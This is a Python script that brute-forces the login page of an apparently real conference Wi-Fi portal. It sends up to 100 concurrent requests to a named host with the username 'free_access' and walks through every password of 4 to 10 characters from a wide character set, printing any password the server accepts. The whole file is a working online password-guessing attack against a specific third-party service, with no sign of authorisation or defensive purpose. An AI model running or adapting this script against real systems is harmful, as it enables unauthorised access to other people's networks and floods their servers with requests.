#!/usr/bin/env python3

import wordlist
import requests
import os

import concurrent.futures
import more_itertools
import urllib

generator = wordlist.Generator("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_,!$%&+-#/()=@")

check_password_url = "http://hsia.rieo.eu/process.php?trylogon=yes&language=en&javascript=enabled&ctype=conference&username=free_access&password={password}&connection=conference&terms=on&submit=Connect"

WORKERS=100
CHUNK=0
STARTCHUNK=0
TIMEOUT=10.0

os.environ["HTTP_PROXY"] = ""

if __name__ == "__main__":
    # Try logon
    def check_password(chunk, password):
        url = check_password_url.format(password=urllib.parse.quote_plus(password))
        res = requests.get(url, allow_redirects=False, timeout=TIMEOUT)
        print(f"{chunk} try {password}               \r", end="")
        if res.status_code == 200:
            return res.text
        else:
            return False

    # We can use a with statement to ensure threads are cleaned up promptly
    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
        # Start the load operations and mark each future with its URL
        try:
            for password_list_chunk in more_itertools.chunked(generator.generate(4,10), WORKERS*10):
                CHUNK+=1
                if STARTCHUNK>CHUNK:
                    print(f"skipping {CHUNK} till {STARTCHUNK}      \r", end="")
                    continue # skip till STARTCHUNK

                future_to_password = {executor.submit(check_password, CHUNK, password): password for password in password_list_chunk}
                for future in concurrent.futures.as_completed(future_to_password):
                    password = future_to_password[future]
                    try:
                        res = future.result()
                    except Exception as exc:
                        print(f"{password} generated an exception: {exc}")
                    else:
                        if res:
                            print(f"\n\nsucceeded with {password}:\n\n{res}")
        except KeyboardInterrupt:
            print("\nShutting down...\n")
            executor.shutdown(wait=False)